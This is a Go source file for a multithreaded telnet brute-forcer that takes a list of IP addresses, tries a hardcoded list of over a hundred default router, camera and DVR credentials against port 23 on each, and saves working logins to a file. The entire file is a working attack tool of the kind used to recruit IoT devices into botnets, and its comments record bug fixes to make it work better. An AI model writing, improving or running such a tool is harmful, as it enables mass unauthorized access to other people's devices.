package main

// Telnet Bruteforcer - dev by bear
// Build: go build -o bruter bruter.go
// Usage: bruter <list.txt> <threads> <output.txt> [debug]

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

const (
	R = "\033[1;31m"
	B = "\033[1;34m"
	C = "\033[1;37m"
	G = "\033[1;32m"
	Y = "\033[1;33m"
	Q = "\033[1;36m"
)

var combo = []string{
	"root:root", "admin:admin", "admin:ADMIN", "daemon:daemon", "root:vizxv",
	"root:pass", "root:anko", "root:1234", "root:", "admin:", "root:xc3511",
	"root:juantech", "default:", "default:default", "supervisor:zyad1234",
	"root:5up", "default:lJwpbo6", "daemon:", "adm:", "root:696969",
	"root:1234567", "User:admin", "guest:12345", "guest:password",
	"root:zlxx.", "root:1001chin", "root:hunt5759", "admin:true", "admin:changeme",
	"baby:baby", "root:xmhdipc", "root:12341234", "root:ttnet",
	"root:Serv4EMC", "default:S2fGqNFs", "default:OxhlwSG8", "toor:root",
	"root:toor", "vstarcam2015:20150602", "root:zsun1188",
	"admin:meinsm", "admin:adslnadam", "root:ipcam_rt5350", "Menara:Menara",
	"admin:ho4uku6at", "root:t0talc0ntr0l4!", "admin:gvt12345", "adminisp:adminisp",
	"root:hi3518", "root:ikwb", "admin:ip3000", "admin:1234", "admin:12345",
	"telnet:telnet", "admin:1234567", "root:system", "admin:password",
	"root:888888", "root:88888888", "root:klv1234", "root:Zte521",
	"root:jvbzd", "root:7ujMko0vizxv", "root:7ujMko0admin", "root:dreambox",
	"root:user", "root:realtek", "root:00000000", "admin:1111111", "admin:54321",
	"admin:123456", "default:123456", "default:antslq", "default:tlJwpbo6",
	"root:default", "default:pass", "default:12345", "default:password",
	"root:taZz@23495859", "root:20080826", "root:gforge",
	"admin:7ujMko0admin", "admin:synnet", "guest:1111", "root:admin1234",
	"root:tl789", "admin:fliradmin", "root:12345678", "root:123456789",
	"root:1234567890", "root:vertex25ektks123", "root:admin@mymifi",
	"admin:pass", "admin:admin1234", "admin:smcadmin",
	"root:1111", "root:54321", "root:666666", "root:klv123",
	"Administrator:admin", "service:service", "supervisor:supervisor",
	"admin1:password", "administrator:1234", "666666:666666",
	"888888:888888", "tech:tech", "admin:dvr2580222", "ubnt:ubnt", "user:12345",
	"admin:aquario", "ftp:ftp", "hikvision:hikvision", "guest:guest",
	"user:user", "root:abc123", "root:admin", "sysadm:sysadm",
	"support:support", "root:cat1029", "admin:cat1029",
	"Alphanetworks:wrgg19_c_dlwbr_dir300",
	"Alphanetworks:wrgn49_dlob_dir600b",
	"Alphanetworks:wrgn23_dlwbr_dir600b",
	"Alphanetworks:wrgn22_dlwbr_dir615",
	"Alphanetworks:wrgnd08_dlob_dir815",
	"Alphanetworks:wrgg15_di524",
	"Alphanetworks:wrgn39_dlob.hans_dir645",
	"Alphanetworks:wapnd03cm_dkbs_dap2555",
	"Alphanetworks:wapnd04cm_dkbs_dap3525",
	"Alphanetworks:wapnd15_dlob_dap1522b",
	"Alphanetworks:wrgac01_dlob.hans_dir865",
	"Alphanetworks:wrgn23_dlwbr_dir300b",
	"Alphanetworks:wrgn28_dlob_dir412",
	"Alphanetworks:wrgn39_dlob.hans_dir645_V1",
	"root:antslq",
}

var (
	outputFile string
	debug      bool
	found      int64
	fileMu     sync.Mutex
	stopOnce   sync.Once
	stopFlag   = make(chan struct{})
)

func stop() {
	stopOnce.Do(func() { close(stopFlag) })
}

func stopped() bool {
	select {
	case <-stopFlag:
		return true
	default:
		return false
	}
}

// readUntil reads until needle appears or the absolute deadline passes.
// Returns the buffer and whether the needle was seen.
func readUntil(conn net.Conn, needle string, timeout time.Duration) (string, bool) {
	buf := make([]byte, 0, 4096)
	tmp := make([]byte, 1024)
	deadline := time.Now().Add(timeout)
	for !stopped() {
		// Fix #1: pass a time.Time, not a Duration
		conn.SetReadDeadline(deadline)
		n, err := conn.Read(tmp)
		if n > 0 {
			buf = append(buf, tmp[:n]...)
			if strings.Contains(string(buf), needle) {
				return string(buf), true
			}
		}
		if err != nil {
			break // timeout or connection closed
		}
	}
	return string(buf), strings.Contains(string(buf), needle)
}

func tryTarget(ip string) {
	for _, cred := range combo {
		if stopped() {
			return
		}
		parts := strings.SplitN(cred, ":", 2)
		username := parts[0]
		password := ""
		if len(parts) > 1 {
			password = parts[1]
		}

		conn, err := net.DialTimeout("tcp", ip+":23", 8*time.Second)
		if err != nil {
			return // host dead/filtered
		}

		if debug {
			// Fix #5: mask the password in debug output
			fmt.Printf("[DEBUG] Testing %s with %s:%s\n", ip, username, strings.Repeat("*", len(password)))
		}

		if _, ok := readUntil(conn, "ogin", 8*time.Second); !ok {
			conn.Close()
			return
		}
		conn.Write([]byte(username + "\n"))
		time.Sleep(90 * time.Millisecond)

		if _, ok := readUntil(conn, "assword", 8*time.Second); !ok {
			conn.Close()
			continue
		}
		conn.Write([]byte(password + "\n"))
		time.Sleep(800 * time.Millisecond)

		resp, _ := readUntil(conn, "\x00", 2*time.Second)
		conn.Close()

		// Fix #4: require a prompt-like response AND absence of failure strings
		success := (strings.Contains(resp, ">") && !strings.Contains(resp, "ONT")) ||
			strings.ContainsAny(resp, "#$%@")
		failure := strings.Contains(resp, "failed") ||
			strings.Contains(resp, "incorrect") ||
			strings.Contains(resp, "invalid") ||
			strings.Contains(resp, "ogin:") ||
			strings.Contains(resp, "locked") ||
			strings.Contains(resp, "rong") ||
			strings.Contains(resp, "ailure") ||
			strings.Contains(resp, "erro")

		if success && !failure {
			fileMu.Lock()
			f, ferr := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if ferr == nil {
				f.WriteString(fmt.Sprintf("%s:23 %s:%s\n", ip, username, password))
				f.Close()
			}
			fileMu.Unlock()
			atomic.AddInt64(&found, 1)
			fmt.Printf("%s[%sOK%s] IP: %s%s%s:%s23%s  %s%s%s:%s%s%s\n",
				C, G, C, Y, ip, C, Y, C, B, username, C, B, password, C)
			return
		}
	}
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: bruter <list.txt> <threads> <output.txt> [debug]")
		os.Exit(1)
	}

	// Fix #2: actually close stopFlag on Ctrl+C / SIGTERM
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigCh
		fmt.Printf("\n%s[!] Interrupt received, stopping...%s\n", Y, C)
		stop()
	}()

	fmt.Println(Q + "\n[*] Telnet Bruter (Go) - dev by bear" + C)

	file, err := os.Open(os.Args[1])
	if err != nil {
		fmt.Println("Error opening list:", err)
		os.Exit(1)
	}
	defer file.Close()

	threads := 500
	fmt.Sscanf(os.Args[2], "%d", &threads)
	if threads <= 0 {
		threads = 500
	}
	outputFile = os.Args[3]
	if len(os.Args) > 4 {
		debug = true
	}

	scanner := bufio.NewScanner(file)
	var lines []string
	for scanner.Scan() {
		if ip := strings.TrimSpace(scanner.Text()); ip != "" {
			lines = append(lines, ip)
		}
	}
	// Fix #3: check for read errors
	if serr := scanner.Err(); serr != nil {
		fmt.Println("Error reading list:", serr)
		os.Exit(1)
	}

	fmt.Printf("[%s-%s] Targets: %d | Threads: %d | dev by bear\n\n", Y, C, len(lines), threads)

	targets := make(chan string, 4096)
	var wg sync.WaitGroup
	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ip := range targets {
				if stopped() {
					return
				}
				tryTarget(ip)
			}
		}()
	}
	for _, ip := range lines {
		if stopped() {
			break
		}
		targets <- ip
	}
	close(targets)
	wg.Wait()

	fmt.Printf("\n[%s-%s] Done! Targets: %d | Successes: %d | Saved: %s\n",
		Y, C, len(lines), atomic.LoadInt64(&found), outputFile)
}